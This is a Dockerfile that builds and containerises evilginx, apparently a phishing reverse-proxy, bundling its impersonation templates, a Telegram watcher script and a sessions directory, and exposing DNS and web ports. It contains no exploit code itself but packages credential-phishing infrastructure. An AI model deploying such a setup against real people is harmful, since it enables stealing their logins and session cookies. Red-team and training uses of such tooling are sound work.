# ---------- Build stage ----------
# go.mod in this repo requires go >= 1.25.7, so a modern toolchain is required.
FROM golang:1.27-alpine AS builder

RUN apk add --no-cache git make gcc musl-dev

WORKDIR /src
COPY . .

RUN go mod tidy
RUN CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /usr/local/bin/evilginx .

# ---------- Runtime stage ----------
FROM alpine:3.19

RUN apk add --no-cache ca-certificates tzdata bash curl su-exec libcap

# Non-root app user
RUN addgroup -S evilginx && adduser -S evilginx -G evilginx

COPY --from=builder /usr/local/bin/evilginx /usr/local/bin/evilginx
COPY --from=builder /src/phishlets /usr/local/share/evilginx/phishlets
COPY entrypoint.sh /entrypoint.sh
COPY telegram-watch.sh /usr/local/bin/telegram-watch.sh
RUN chmod +x /entrypoint.sh /usr/local/bin/telegram-watch.sh && \
    setcap cap_net_bind_service=+ep /usr/local/bin/evilginx

WORKDIR /app
RUN mkdir -p /app/phishlets /app/sessions /app/certs && \
    chown -R evilginx:evilginx /app

# Entrypoint starts as root (fixes volume ownership), then drops to 'evilginx'
EXPOSE 53/udp 53/tcp 80/tcp 443/tcp

ENTRYPOINT ["/entrypoint.sh"]
